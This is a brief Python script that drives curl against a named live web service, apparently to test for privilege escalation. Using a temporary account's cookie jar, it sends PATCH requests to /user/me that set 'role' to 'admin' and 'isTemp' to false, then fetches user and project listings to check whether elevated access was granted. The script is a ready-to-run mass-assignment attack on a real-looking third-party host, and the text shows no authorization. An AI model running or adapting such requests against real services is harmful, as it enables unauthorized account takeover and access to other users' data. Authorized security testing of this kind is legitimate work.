import subprocess
common=['curl','-sS','--max-time','20','-H','Origin: https://design.ui.com','-H','Referer: https://design.ui.com/','-H','Content-Type: application/json','-w','\nHTTP %{http_code}\n']
def run(tag,method,path,body=None,jar='/tmp/t1.txt'):
    cmd=common+['-b',jar,'-c',jar,'-X',method]
    if body is not None: cmd+=['--data',body]
    r=subprocess.run(cmd+['https://design.svc.ui.com'+path],capture_output=True,text=True)
    print('=====',tag); print(r.stdout[-900:])
run('temp me init','GET','/user/me')
run('patch role admin','PATCH','/user/me','{"role":"admin"}')
run('patch isTemp false','PATCH','/user/me','{"isTemp":false,"role":"admin"}')
run('get me after','GET','/user/me')
run('project all after','GET','/project/all')
run('project after','GET','/project')
